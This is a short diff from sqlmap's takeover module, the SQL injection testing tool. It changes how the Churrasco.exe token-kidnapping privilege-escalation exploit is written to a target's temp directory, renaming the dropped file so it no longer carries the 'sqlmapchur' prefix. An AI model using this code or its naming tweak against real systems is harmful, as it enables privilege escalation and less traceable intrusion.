@@ -67,9 +67,9 @@ class Takeover(Abstraction, Metasploit, Registry):
 
         if output and output[0] in ( "y", "Y" ):
             tmpFile = decloakToNamedTemporaryFile(os.path.join(paths.SQLMAP_CONTRIB_PATH, "tokenkidnapping", "Churrasco.exe_"))
-            
+
             wFile                 = tmpFile.name
-            self.churrascoPath    = "%s/sqlmapchur%s.exe" % (conf.tmpPath, randomStr(lowercase=True))
+            self.churrascoPath    = "%s/tmpc%s.exe" % (conf.tmpPath, randomStr(lowercase=True))
             self.cmdFromChurrasco = True
             
             self.writeFile(wFile, self.churrascoPath, "binary", confirm=False)
